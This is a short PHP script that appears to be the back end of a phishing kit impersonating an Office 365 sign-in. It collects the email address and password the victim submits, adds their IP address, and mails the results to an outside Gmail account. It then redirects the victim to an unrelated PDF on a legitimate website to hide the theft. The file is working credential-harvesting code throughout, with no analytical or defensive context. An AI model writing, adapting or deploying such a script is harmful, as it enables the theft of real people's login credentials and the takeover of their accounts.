<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office 365-----------------------\n";
$message .= "Email: ".$_POST['login']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Good Vibes------------------------------\n";


$recipient = "onlinewithkellyyy@gmail.com";
$subject = "Office 365 RESULT $ip | ".$_POST['login']."\n";
$headers = "info@Feranmi.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Feranmi", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.sabpp.co.za/wp-content/uploads/2016/12/Code_of_Ethics_for_HR_Consul.pdf");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>